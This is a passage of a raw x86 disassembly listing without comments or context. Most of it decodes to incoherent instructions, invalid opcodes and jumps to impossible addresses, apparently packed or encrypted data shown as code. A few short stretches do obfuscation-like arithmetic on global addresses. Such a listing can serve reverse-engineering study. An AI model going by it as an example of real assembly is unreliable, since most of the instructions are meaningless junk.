  401908:	mov    ebp,0x7cb5420e
  40190d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40190e:	mov    dl,0x2a
  401910:	pop    eax
  401911:	call   0xf7a497bf
  401916:	dec    edx
  401917:	nop
  401918:	mov    es,WORD PTR [edx+0x55c9df10]
  40191e:	in     al,dx
  40191f:	or     DWORD PTR [esi+0x50b17bf1],ebp
  401925:	mov    ds:0xd90144cb,eax
  40192a:	inc    esi
  40192b:	rcl    DWORD PTR [ecx],1
  40192d:	dec    eax
  40192e:	push   ebp
  40192f:	sar    edi,0x49
  401932:	add    eax,0x7cceb60f
  401937:	sbb    cl,BYTE PTR [edi]
  401939:	pop    ebp
  40193a:	cmp    al,0x6f
  40193c:	leave  
  40193d:	loope  0x401985
  40193f:	test   BYTE PTR [ecx],0xb2
  401942:	mov    bh,0x43
  401944:	sti    
  401945:	popa   
  401946:	enter  0x3993,0xf
  40194a:	das    
  40194b:	dec    ebx
  40194c:	pop    ebp
  40194d:	ja     0x4019a5
  40194f:	lea    edi,[esi-0x7c]
  401952:	lds    esp,FWORD PTR [eax+0x496d6103]
  401958:	inc    esp
  401959:	jmp    0xec979f76
  40195e:	jb     0x4019b5
  401960:	push   es
  401961:	not    BYTE PTR [ecx+0x71]
  401964:	cs addr16 xor ebx,edx
  401968:	mov    ah,0x9d
  40196a:	out    0xdc,eax
  40196c:	xor    ecx,ebp
  40196e:	mov    ebx,0x16248808
  401973:	and    BYTE PTR [edx],al
  401975:	aaa    
  401976:	mov    ds:0x3656eb00,al
  40197b:	xchg   DWORD PTR ds:0x6aa69ef7,edi
  401981:	test   DWORD PTR [ecx+ebp*2],ecx
  401984:	call   0xdec4:0x5e634413
  40198b:	jns    0x401958
  40198d:	mov    dl,0xbe
  40198f:	dec    edx
  401990:	sub    BYTE PTR [edi+edx*4-0x147879c6],0xdf
  401998:	clc    
  401999:	repnz sti 
  40199b:	lods   eax,DWORD PTR ds:[esi]
  40199c:	sbb    al,0x37
  40199e:	sbb    al,0x4
  4019a0:	jnp    0x401930
  4019a2:	adc    eax,0xc09fa8dd
  4019a7:	repz pop ds
  4019a9:	stc    
  4019aa:	test   al,0x79
  4019ac:	jecxz  0x401a23
  4019ae:	lods   eax,DWORD PTR ds:[esi]
  4019af:	xor    eax,edx
  4019b1:	cmp    eax,0x8cb40b7d
  4019b6:	je     0x4019d9
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	enter  0x6780,0x17
  401a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a1e:	jnp    0x401a90
  401a20:	jo     0x4019b9
  401a22:	jge    0x401a94
  401a24:	jo     0x4019d0
  401a26:	and    BYTE PTR [ebp+eiz*4-0x29],ah
  401a2a:	mov    eax,ds:0x933da1f4
  401a2f:	fs cld 
  401a31:	pop    edi
  401a32:	inc    ebp
  401a33:	jo     0x401a99
  401a35:	mov    ?,WORD PTR ss:[eax+ecx*4+0x66]
  401a3a:	sub    BYTE PTR [ebx-0x28],dl
  401a3d:	or     ecx,DWORD PTR cs:[esp+esi*2+0x6]
  401a42:	inc    esi
  401a43:	inc    eax
  401a44:	mov    al,0x5a
  401a46:	jmp    0x90536228
  401a4b:	jnp    0x401a94
  401a4d:	gs and al,0x9c
  401a50:	stos   BYTE PTR es:[edi],al
  401a51:	enter  0xf4bc,0x98
  401a55:	repz xchg ebx,eax
  401a57:	push   edx
  401a58:	mov    edx,0x7a7a752d
  401a5d:	pushf  
  401a5e:	cld    
  401a5f:	or     eax,0xd4878678
  401a64:	sub    eax,0x3906203e
  401a69:	add    DWORD PTR [ecx-0x7],ebx
  401a6c:	mov    dh,0xbd
  401a6e:	inc    eax
  401a6f:	xchg   edx,eax
  401a70:	pop    esp
  401a71:	ins    DWORD PTR es:[edi],dx
  401a72:	push   esi
  401a73:	jae    0x401a3c
  401a75:	dec    BYTE PTR [edx+ecx*1-0x3d]
  401a79:	cli    
  401a7a:	inc    esp
  401a7b:	jle    0x401afb
  401a7d:	outs   dx,DWORD PTR ds:[esi]
  401a7e:	aaa    
  401a7f:	jns    0x401a68
  401a81:	or     cl,BYTE PTR [edi-0x51]
  401a84:	mov    dl,0xb4
  401a86:	jnp    0x401aec
  401a88:	mov    eax,0x8fdf3210
  401a8d:	mov    ah,0xd7
  401a8f:	jge    0x401b09
  401a91:	into   
  401a92:	jne    0x401aea
  401a94:	mov    eax,ds:0x971b3c4a
  401a99:	mov    esp,0xf081a0a5
  401a9e:	jge    0x401ac0
  401aa0:	mov    esi,0x906ca8f5
  401aa5:	call   0x147b89
  401aaa:	ds aad 0xa
  401aad:	dec    ecx
  401aae:	jne    0x401b1f
  401ab0:	xchg   esi,eax
  401ab1:	imul   ebp,DWORD PTR [ebp-0x51],0xffffffd3
  401ab5:	loope  0x401af8
  401ab7:	cld    
  401ab8:	popf   
  401ab9:	fs xor al,0xef
  401abc:	fwait
  401abd:	femms  
  401abf:	or     al,0x7c
  401ac1:	dec    ebp
  401ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ac3:	pop    ecx
  401ac4:	test   BYTE PTR [esi+ebp*8+0x59],dh
  401ac8:	sbb    eax,0x2cd3e8d8
  401acd:	jns    0x401aa7
  401acf:	scas   al,BYTE PTR es:[edi]
  401ad0:	push   esi
  401ad1:	loopne 0x401b34
  401ad3:	lods   eax,DWORD PTR ds:[esi]
  401ad4:	test   al,0x79
  401ad6:	pminsw mm0,QWORD PTR [esi-0x3e]
  401ada:	sbb    eax,0xc45a288
  401adf:	dec    BYTE PTR [edi]
  401ae1:	jbe    0x401a9d
  401ae3:	dec    esi
  401ae4:	gs icebp 
  401ae6:	cmp    esi,DWORD PTR [ecx+0x27]
  401ae9:	jmp    0xdacaf7a0
  401aee:	push   eax
  401aef:	inc    eax
  401af0:	jle    0x401b3a
  401af2:	mov    edx,DWORD PTR [edx]
  401af4:	push   DWORD PTR [eax+0x596fc7c]
  401afa:	xor    ebx,edi
  401afc:	icebp  
  401afd:	and    eax,0xd0637168
  401b02:	pop    edi
  401b03:	cmp    bh,BYTE PTR [edi]
  401b05:	sub    al,0xf5
  401b07:	sub    dl,cl
  401b09:	leave  
  401b0a:	aaa    
  401b0b:	jg     0x401aad
  401b0d:	enter  0xc93a,0x7
  401b11:	icebp  
  401b12:	into   
  401b13:	test   DWORD PTR ds:0x83ece5f7,esi
  401b19:	jge    0x401b34
  401b1b:	and    eax,ebp
  401b1d:	and    DWORD PTR [ebx-0x49],esp
  401b20:	in     eax,0x50
  401b22:	jno    0x401b9f
  401b24:	pop    es
  401b25:	jb     0x401b7a
  401b27:	lods   al,BYTE PTR ds:[esi]
  401b28:	push   cs
  401b29:	lods   al,BYTE PTR ds:[esi]
  401b2a:	lock sahf 
  401b2c:	enter  0x5f7d,0xea
  401b30:	inc    ebp
  401b31:	scas   al,BYTE PTR es:[edi]
  401b32:	test   eax,0x7a97d6b8
  401b37:	jns    0x401b27
  401b39:	gs push ebp
  401b3b:	xchg   ecx,eax
  401b3c:	cmp    DWORD PTR [esi-0x619ec418],edi
  401b42:	and    eax,0x3d8a906c
  401b47:	and    BYTE PTR [esi-0x4c46b67a],cl
  401b4d:	cld    
  401b4e:	js     0x401b31
  401b50:	inc    esp
  401b51:	aad    0x3d
  401b53:	sahf   
  401b54:	sub    DWORD PTR ds:0xf917e501,eax
  401b5a:	(bad)  
  401b5b:	and    bl,BYTE PTR [esi-0x9b6b98c]
  401b61:	jns    0x401b6b
  401b63:	mov    eax,ds:0x3df1c544
  401b68:	inc    ecx
  401b69:	dec    eax
  401b6a:	mov    esi,0x94625882
  401b6f:	cmp    BYTE PTR [edi+0x13],cl
  401b72:	mov    BYTE PTR [ebx-0x16],ah
  401b75:	gs inc esp
  401b77:	add    BYTE PTR [edi+0x36],cl
  401b7a:	push   esi
  401b7b:	data16 int3 
  401b7d:	stc    
  401b7e:	ins    DWORD PTR es:[edi],dx
  401b7f:	rcr    DWORD PTR [ebp+0x424943eb],0x91
  401b86:	mov    cl,0xf3
  401b88:	dec    edx
  401b89:	xor    dl,BYTE PTR [eax-0x52]
  401b8c:	int3   
  401b8d:	sub    DWORD PTR ds:0x5742b396,esp
  401b93:	test   ah,bh
  401b95:	stos   BYTE PTR es:[edi],al
  401b96:	call   0x8428003b
  401b9b:	push   ebx
  401b9c:	push   0x1a75a876
  401ba1:	mov    edi,0x2023f1bd
  401ba6:	js     0x401c05
  401ba8:	jecxz  0x401bf9
  401baa:	aaa    
  401bab:	(bad)  
  401bac:	pop    ecx
  401bad:	jno    0x401b6b
  401baf:	push   ecx
  401bb0:	scas   al,BYTE PTR es:[edi]
  401bb1:	int    0xeb
  401bb3:	repnz enter 0xa549,0x81
  401bb8:	daa    
  401bb9:	bnd js 0x401b78
  401bbc:	push   cs
  401bbd:	adc    al,BYTE PTR [edx+edi*8]
  401bc0:	(bad)  
  401bc1:	sub    BYTE PTR [esi],cl
  401bc3:	push   es
  401bc4:	cmp    DWORD PTR [ecx-0x4c],esi
  401bc7:	and    eax,0x2f92c90d
  401bcc:	call   0x991735ae
  401bd1:	enter  0x3325,0x62
  401bd5:	xor    eax,0x7adcf9fc
  401bda:	bound  esp,QWORD PTR [edx+esi*8+0x68]
  401bde:	and    DWORD PTR [ecx+0x6d71a412],0x98eff2a3
  401be8:	test   BYTE PTR [esi+0xcd46009],ah
  401bee:	(bad)  
  401bef:	arpl   WORD PTR [ebx-0x24d672b9],bx
  401bf5:	fist   DWORD PTR [ebx+edi*1]
  401bf8:	in     eax,0x7d
  401bfa:	or     al,0x90
  401bfc:	ret    
  401bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bfe:	nop
  401bff:	xchg   edx,eax
  401c00:	iret   
  401c01:	push   es
  401c02:	ficom  DWORD PTR [esi+edi*4+0x20c63afb]
  401c09:	push   ss
  401c0a:	adc    bh,ah
  401c0c:	(bad)  
  401c0e:	mov    esi,0xfc1ba53f
  401c13:	sbb    ch,BYTE PTR [ebx+ebx*2-0x2da7b66a]
  401c1a:	mov    ?,WORD PTR [eax-0x9]
  401c1d:	sahf   
  401c1e:	pop    ecx
  401c1f:	sub    eax,DWORD PTR [eax-0x29a3dd08]
  401c25:	aam    0x71
  401c27:	int    0xfb
  401c29:	xchg   DWORD PTR [ecx+0x7f],ebx
  401c2c:	repnz cmp ebp,ecx
  401c2f:	mov    dh,ah
  401c31:	push   cs
  401c32:	mov    ecx,0x978a67cf
  401c37:	jp     0x401c92
  401c39:	hlt    
  401c3a:	(bad)  [ebx-0x3cdca3e7]
  401c40:	sub    dh,dh
  401c42:	jo     0x401cac
  401c44:	daa    
  401c45:	sbb    al,0xe5
  401c47:	(bad)  
  401c48:	ja     0x401c28
  401c4a:	jg     0x401c50
  401c4c:	add    DWORD PTR [edi],0x51
  401c4f:	push   ebx
  401c50:	(bad)  
  401c51:	int    0x0
  401c53:	pop    edi
  401c54:	fcom   QWORD PTR [ecx+0x1a83bf25]
  401c5a:	dec    edx
  401c5b:	sbb    al,0x7a
  401c5d:	add    eax,0x81c94725
  401c62:	ret    
  401c63:	pop    edx
  401c64:	neg    DWORD PTR [edx-0x1758a0a2]
  401c6a:	(bad)  
  401c6c:	je     0x401c42
  401c6e:	pop    esi
  401c6f:	jns    0x401c13
  401c71:	fiadd  DWORD PTR [ebx-0x7b80c1ed]
  401c77:	aas    
  401c78:	xor    ch,bl
  401c7a:	(bad)  
  401c7b:	mov    al,0x16
  401c7d:	sti    
  401c7e:	ds and esi,edx
  401c81:	push   edx
  401c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c83:	hlt    
  401c84:	sub    dh,BYTE PTR [eax+0x20]
  401c87:	xor    DWORD PTR [ecx],0x3d
  401c8a:	test   DWORD PTR [ebp+0x22],ebp
  401c8d:	mov    esp,0x2583c30b
  401c92:	bound  ebx,QWORD PTR [edi+0x63]
  401c95:	ret    
  401c96:	nop
  401c97:	and    eax,0xb56ffaa8
  401c9c:	dec    ebx
  401c9d:	(bad)  
  401c9e:	jno    0x401cef
  401ca0:	push   ecx
  401ca1:	loope  0x401cf5
  401ca3:	pop    ecx
  401ca4:	dec    eax
  401ca5:	sbb    al,0x87
  401ca7:	mov    al,0x50
  401ca9:	leave  
  401caa:	mov    al,0xbd
  401cac:	mov    BYTE PTR [ecx-0x3d1cd3d0],0x5b
  401cb3:	mov    ss,WORD PTR [edi-0x3aa6d7ab]
  401cb9:	mov    ch,0x51
  401cbb:	cmp    bh,BYTE PTR [esi+edx*2]
  401cbe:	les    ecx,FWORD PTR [esi+0x24]
  401cc1:	in     eax,0x65
  401cc3:	jle    0x401cc5
  401cc5:	jne    0x401d08
  401cc7:	push   edi
  401cc8:	nop
  401cc9:	mov    eax,0x4380a93d
  401cce:	sub    DWORD PTR [edi-0x7a],0x5704d5c7
  401cd5:	cmp    al,0x97
  401cd7:	outs   dx,DWORD PTR ds:[esi]
  401cd8:	inc    esi
  401cd9:	inc    edx
  401cda:	jmp    0x53ba:0x72cb79b7
  401ce1:	pushf  
  401ce2:	inc    ecx
  401ce3:	inc    edi
  401ce4:	or     DWORD PTR [ecx-0x7b],esi
  401ce7:	pop    eax
  401ce8:	(bad)  
  401ce9:	xor    ebx,eax
  401ceb:	mov    dh,0x2b
  401ced:	pusha  
  401cee:	mov    ds:0xe42702af,al
  401cf3:	leave  
  401cf4:	gs enter 0x1b7e,0x34
  401cf9:	push   cs
  401cfa:	punpcklbw mm5,DWORD PTR [ebp+ebp*2+0x1b]
  401cff:	sahf   
  401d00:	pop    ecx
  401d01:	mov    eax,ds:0x6fb09729
  401d06:	in     eax,dx
  401d07:	mov    edx,0x95eb7728
  401d0c:	and    ebp,DWORD PTR [edi+edx*8]
  401d0f:	mov    ds:0x5c3ad5e,al
  401d14:	pop    ds
  401d15:	in     eax,dx
  401d16:	call   DWORD PTR [edi-0x1da13b0d]
  401d1c:	and    dl,0x56
  401d1f:	jmp    0xd68e:0x5e9ec1c3
  401d26:	cmp    ebx,ebx
  401d28:	(bad)  
  401d29:	into   
  401d2a:	xlat   BYTE PTR ds:[ebx]
  401d2b:	fisubr DWORD PTR [esi+0x28]
  401d2e:	repnz fs dec edi
  401d31:	retf   
  401d32:	clc    
  401d33:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  401d35:	test   al,0xf7
  401d37:	jge    0x401d93
  401d39:	add    al,0xc6
  401d3b:	mov    ebx,0x503277d
  401d40:	test   eax,0x3992d64d
  401d45:	cmp    eax,0xa549c633
  401d4a:	mov    dl,0x55
  401d4c:	dec    dx
  401d4e:	xor    dh,dl
  401d50:	fdivr  DWORD PTR [ecx]
  401d52:	(bad)  
  401d53:	and    al,0x51
  401d55:	pop    ss
  401d56:	addr16 xor ecx,edi
  401d59:	sbb    eax,0x272db876
  401d5e:	call   0x523c7516
  401d63:	imul   ebx,DWORD PTR [ebx+edx*2+0x5],0x644cc1cb
  401d6b:	xor    DWORD PTR [ebx+0x38fa2536],ebx
  401d71:	lea    esp,[ecx+0x61]
  401d74:	xlat   BYTE PTR ds:[ebx]
  401d75:	leave  
  401d76:	sbb    cl,BYTE PTR [ebx-0x462f7bd2]
  401d7c:	mov    al,ds:0x76064e58
  401d81:	or     ah,0xe4
  401d84:	ins    DWORD PTR es:[edi],dx
  401d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d86:	jbe    0x401d8f
  401d88:	sub    eax,0x5fedcb40
  401d8d:	outs   dx,DWORD PTR ds:[esi]
  401d8e:	shl    BYTE PTR [ebp-0x12],cl
  401d91:	or     al,BYTE PTR [edx-0x7]
  401d94:	fisttp QWORD PTR [edi+0x5a]
  401d97:	leave  
  401d98:	inc    edi
  401d99:	cmc    
  401d9a:	push   esp
  401d9b:	fdiv   QWORD PTR [eax]
  401d9d:	mov    ds,ebp
  401d9f:	cli    
  401da0:	cwde   
  401da1:	cmp    BYTE PTR [ebx+0x0],dh
  401da4:	pop    eax
  401da5:	sar    BYTE PTR ds:0x327edfa3,cl
  401dab:	cmp    DWORD PTR [ebx+ebx*4],0xebfd9197
  401db2:	pop    esi
  401db3:	push   ebx
  401db4:	sbb    al,bl
  401db6:	mov    ds:0x2c5c3902,eax
  401dbb:	and    DWORD PTR [esi],ebx
  401dbd:	fwait
  401dbe:	push   ecx
  401dbf:	push   ecx
  401dc0:	xor    DWORD PTR ds:0x434366,ebx
  401dc6:	mov    eax,0xf89c8531
  401dcb:	sub    DWORD PTR ds:0x432dde,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432dce,0x43436e
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	mov    edi,0x3be8b42d
  401df4:	pop    es
  401df5:	jo     0x401e67
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401df6
  401dfc:	mov    bh,0x41
  401dfe:	mov    dh,0x63
  401e00:	sub    al,0x72
  401e02:	popf   
  401e03:	shl    DWORD PTR [edi-0x5cab01e0],0xbb
  401e0a:	xchg   BYTE PTR ds:0xe7002544,bl
  401e10:	mov    al,0x35
  401e12:	jb     0x401e15
  401e14:	mov    BYTE PTR [ebx+esi*2],dl
  401e17:	push   ebp
  401e18:	mov    al,0xce
  401e1a:	dec    edx
  401e1b:	push   es
  401e1c:	pushf  
  401e1d:	out    0x44,al
  401e1f:	cmc    
  401e20:	iret   
  401e21:	inc    ebp
  401e22:	or     DWORD PTR [edi-0x2b],edx
  401e25:	xchg   edi,eax
  401e26:	ins    DWORD PTR es:[edi],dx
  401e27:	lock or ch,cl
  401e2a:	fldenv [eax]
  401e2c:	cmp    eax,0x667c0b71
  401e31:	sbb    eax,0x5025a006
  401e36:	stc    
  401e37:	jns    0x401e2b
  401e39:	nop
  401e3a:	iret   
  401e3b:	or     al,0xff
  401e3d:	xor    edx,ebp
  401e3f:	call   0xc0f0:0xdaf79e72
  401e46:	(bad)  
  401e47:	and    DWORD PTR [ebx-0x3f31a9dd],esp
  401e4d:	ret    0x3e1a
  401e50:	or     al,0xaa
  401e52:	nop
  401e53:	sbb    eax,0x297e88c4
  401e58:	pop    ds
  401e59:	(bad)  
  401e5a:	cmp    ecx,DWORD PTR [ecx+ecx*8-0x79]
  401e5e:	ror    DWORD PTR [edx],cl
  401e60:	(bad)  
  401e61:	outs   dx,DWORD PTR ds:[esi]
  401e62:	jp     0x401e00
  401e64:	push   ecx
  401e65:	fadd   st,st(0)
  401e67:	popa   
  401e68:	mov    eax,ds:0x3b5f9223
  401e6d:	out    dx,eax
  401e6e:	jmp    0x401ea6
  401e70:	and    dl,BYTE PTR [ebx+0x44]
  401e73:	es popa 
  401e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e76:	xor    al,ah
  401e78:	push   edi
  401e79:	js     0x401ef4
  401e7b:	pop    esp
  401e7c:	mov    ds:0xc8da63e5,al
  401e81:	shr    DWORD PTR [edx-0x28362337],0x16
  401e88:	mov    ds,WORD PTR [esi+0x69a0001c]
  401e8e:	popf   
  401e8f:	cld    
  401e90:	out    dx,al
  401e91:	or     eax,0xa4921864
  401e96:	lods   eax,DWORD PTR ds:[esi]
  401e97:	imul   edi,DWORD PTR [edx+0x15],0x3539e712
  401e9e:	xlat   BYTE PTR ds:[ebx]
  401e9f:	sbb    bh,BYTE PTR [esi]
  401ea1:	outs   dx,DWORD PTR ds:[esi]
  401ea2:	ds fcom st(7)
  401ea5:	pop    ebx
  401ea6:	mov    sp,0x5ade
  401eaa:	int3   
  401eab:	in     eax,dx
  401eac:	fldenv [eax+0x4c]
  401eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eb0:	inc    eax
  401eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eb2:	test   eax,0x6e55bca3
  401eb7:	inc    ebx
  401eb8:	outs   dx,BYTE PTR ds:[esi]
  401eb9:	dec    esp
  401eba:	adc    bh,0xa1
  401ebd:	cld    
  401ebe:	pusha  
  401ebf:	or     BYTE PTR [esi],ah
  401ec1:	mov    eax,0x2ad0148e
  401ec6:	cli    
  401ec7:	inc    ebp
  401ec8:	popf   
  401ec9:	xchg   ebp,eax
  401eca:	mov    ds:0xa073d597,eax
  401ecf:	jge    0x401eea
  401ed1:	push   esp
  401ed2:	mov    bl,0xb7
  401ed4:	imul   ebp,DWORD PTR [ecx+0x17aaae55],0xc98fc05c
  401ede:	retf   
  401edf:	jns    0x401e8f
  401ee1:	icebp  
  401ee2:	lea    esp,[eax-0x1a86efd5]
  401ee8:	push   eax
  401ee9:	out    0xc1,al
  401eeb:	xlat   BYTE PTR ds:[ebx]
  401eec:	push   esp
  401eed:	pop    eax
  401eee:	daa    
  401eef:	adc    bl,0xbb
  401ef2:	aas    
  401ef3:	xchg   DWORD PTR [eax],ebp
  401ef5:	cli    
  401ef6:	fimul  DWORD PTR [ecx+0x61]
  401ef9:	or     cl,al
  401efb:	adc    dh,BYTE PTR [esi+0x425cfb3e]
  401f01:	and    dl,ah
  401f03:	lods   eax,DWORD PTR ds:[esi]
  401f04:	repz js 0x401f40
  401f07:	cwde   
  401f08:	xor    al,0x34
  401f0a:	into   
  401f0b:	lahf   
  401f0c:	mov    dh,0xf7
  401f0e:	jecxz  0x401edf
  401f10:	pop    esp
  401f11:	(bad)  
  401f12:	cmp    DWORD PTR ds:[eax],0x49
  401f16:	fbld   TBYTE PTR [ebx+0x4816f547]
  401f1c:	sub    al,BYTE PTR [esi]
  401f1e:	sar    DWORD PTR [edi+eax*8-0x3c4544a9],0xe8
  401f26:	mov    cs:0x20af7cb3,al
  401f2c:	pop    ebx
  401f2d:	sub    al,0x7a
  401f2f:	sti    
  401f30:	mov    bl,0x1f
  401f32:	jl     0x401f23
  401f34:	or     ebx,ebp
  401f36:	jge    0x401ef4
  401f38:	(bad)  
  401f39:	div    BYTE PTR es:[ebx+0x6a]
  401f3d:	rcr    DWORD PTR ds:0xabc3a1ac,cl
  401f43:	and    BYTE PTR [ecx-0x4046617],dh
  401f49:	retf   0x601b
  401f4c:	jo     0x401fbe
  401f4e:	mov    WORD PTR [ebx-0x52],es
  401f51:	sti    
  401f52:	inc    esi
  401f53:	call   0x811d799c
  401f58:	adc    BYTE PTR [esi],al
  401f5a:	repnz mov cl,0x69
  401f5d:	lock jp 0x401f76
  401f60:	retf   0xca0d
  401f63:	mov    ebp,0xf9977e4a
  401f68:	dec    edi
  401f69:	jmp    0x401f7f
  401f6b:	(bad)  
  401f6c:	repnz (bad) 
  401f6e:	(bad)  
  401f6f:	xchg   ebp,eax
  401f70:	shl    BYTE PTR [esi+esi*1+0x4e5bb167],1
  401f77:	cmp    eax,0x3c1a3fe8
  401f7c:	mov    bh,0x8b
  401f7e:	jns    0x401faf
  401f80:	push   cs
  401f81:	(bad)  
  401f82:	addr16 cdq 
  401f84:	push   es
  401f85:	push   es
  401f86:	imul   bh
  401f88:	cmp    bl,bl
  401f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f8b:	xchg   ebp,eax
  401f8c:	sahf   
  401f8d:	sbb    al,0x3b
  401f8f:	ror    BYTE PTR [ebx+ebp*2-0x3c],cl
  401f93:	push   esp
  401f94:	lods   eax,DWORD PTR ds:[esi]
  401f95:	jl     0x401f7c
  401f97:	mov    ah,0x6b
  401f99:	ret    
  401f9a:	bound  ebp,QWORD PTR [esi+0x4495677b]
  401fa0:	fs push edx
  401fa2:	and    edi,DWORD PTR [esi-0x57ef9784]
  401fa8:	shr    DWORD PTR [edi+0x35],1
  401fab:	out    dx,eax
  401fac:	jns    0x401fe4
  401fae:	(bad)  
  401faf:	(bad)  
  401fb0:	push   ss
  401fb1:	scas   eax,DWORD PTR es:[edi]
  401fb2:	popf   
  401fb3:	cdq    
  401fb4:	jp     0x401fda
  401fb6:	ja     0x401fcb
  401fb8:	aas    
  401fb9:	push   esp
  401fba:	jl     0x402023
  401fbc:	pop    ss
  401fbd:	nop
  401fbe:	fs call 0x56bd2098
  401fc4:	mov    al,0xdc
  401fc6:	push   edx
  401fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc8:	lods   al,BYTE PTR ds:[esi]
  401fc9:	jg     0x402015
  401fcb:	fsubr  DWORD PTR [eax+0x37a1599c]
  401fd1:	push   es
  401fd2:	shl    DWORD PTR ds:0x22316a66,0x3c
  401fd9:	mov    ebp,0x2b0af718
  401fde:	es mov bl,0x33
  401fe1:	lds    esp,FWORD PTR [ecx+0x4d35dcce]
  401fe7:	repz mov ebx,0xa7e9314
  401fed:	push   es
  401fee:	cwde   
  401fef:	fyl2x  
  401ff1:	mov    ds:0x31047f09,eax
  401ff6:	mov    dh,0x52
  401ff8:	mov    ecx,DWORD PTR [ebx+0x62544dc0]
  401ffe:	inc    edi
  401fff:	clc    
  402000:	loop   0x401f93
  402002:	mov    cl,0x6a
  402004:	inc    edi
  402005:	adc    DWORD PTR [ebx+0x5811dd10],0xffffffee
  40200c:	xor    dl,BYTE PTR [ebx+0x59]
  40200f:	sub    al,0x4e
  402011:	sbb    bh,dh
  402013:	sbb    ebp,ecx
  402015:	adc    al,0x62
  402017:	addr16 push 0x695e7554
  40201d:	pop    ebp
  40201e:	shr    DWORD PTR [edi+ebp*4],cl
  402021:	mov    eax,ds:0xdfb5a341
  402026:	jmp    0x402028
  402028:	dec    ecx
  402029:	call   0x81be:0x491842be
  402030:	hlt    
  402031:	sahf   
  402032:	mov    edx,0x9e4e519b
  402037:	mov    bl,0x37
  402039:	fisubr DWORD PTR [ebp-0x3a4d9449]
  40203f:	mov    bh,0x93
  402041:	gs out dx,eax
  402043:	add    dl,0xa8
  402046:	sbb    eax,0xddd2a785
  40204b:	xchg   ebx,eax
  40204c:	push   es
  40204d:	dec    ebp
  40204e:	mov    al,ds:0x5e01ee02
  402053:	pusha  
  402054:	xchg   BYTE PTR [edx-0x4c39864f],dl
  40205a:	xor    BYTE PTR [ebx-0x16234465],cl
  402060:	pop    eax
  402061:	push   0xffffffc7
  402063:	mov    ebx,esi
  402065:	ins    DWORD PTR es:[edi],dx
  402066:	push   esi
  402067:	inc    eax
  402068:	mov    bh,0xad
  40206a:	xchg   ecx,eax
  40206b:	push   0x6e
  40206d:	add    eax,DWORD PTR [esi-0x15]
  402070:	test   eax,0x29a4c640
  402075:	scas   eax,DWORD PTR es:[edi]
  402076:	out    0x1c,eax
  402078:	sbb    eax,DWORD PTR [esi]
  40207a:	je     0x40200e
  40207c:	inc    esi
  40207d:	adc    ecx,DWORD PTR [ebp+0x3289b5ed]
  402083:	data16 sub al,0xd
  402086:	inc    esi
  402087:	retf   0x7866
  40208a:	mov    eax,ds:0x4517ec16
  40208f:	jns    0x40201a
  402091:	cdq    
  402092:	lock test al,0x1d
  402095:	lea    edi,[ecx-0x36]
  402098:	add    BYTE PTR ds:0x2d7250b1,ah
  40209e:	lock pop eax
  4020a0:	cmp    edx,edi
  4020a2:	xor    al,0x94
  4020a4:	ret    
  4020a5:	xchg   BYTE PTR [edi],ah
  4020a7:	cli    
  4020a8:	xor    DWORD PTR [edi+0x78a81264],esi
  4020ae:	push   0xfffffffa
  4020b0:	dec    eax
  4020b1:	cli    
  4020b2:	fild   WORD PTR [ebp-0x27dfd7b2]
  4020b8:	cmc    
  4020b9:	push   es
  4020ba:	dec    eax
  4020bb:	mul    BYTE PTR [ebx-0x66]
  4020be:	jg     0x402070
  4020c0:	cwde   
  4020c1:	in     al,0x27
  4020c3:	fwait
  4020c4:	jmp    0x6acb:0x68eab5c3
  4020cb:	imul   edx,ebp,0x44
  4020ce:	jmp    0x7eb3e18b
  4020d3:	retf   
  4020d4:	imul   ecx,DWORD PTR [ebx+ecx*2+0x4e],0xffffffdc
  4020d9:	gs pop ds
  4020db:	hlt    
  4020dc:	out    dx,al
  4020dd:	mov    esi,0x55b664b8
  4020e2:	push   ss
  4020e3:	rcl    BYTE PTR [ecx+ecx*2-0x6d4a45fd],1
  4020ea:	adc    dh,bl
  4020ec:	mov    dx,0x49a7
  4020f0:	cli    
  4020f1:	mov    eax,0x1db9e22f
  4020f6:	aaa    
  4020f7:	jno    0x40211d
  4020f9:	test   al,0xb9
  4020fb:	stc    
  4020fc:	cld    
  4020fd:	in     eax,dx
  4020fe:	fisttp WORD PTR [ebx]
  402100:	xor    BYTE PTR [ebx+0x65],bh
  402103:	fdiv   st(1),st
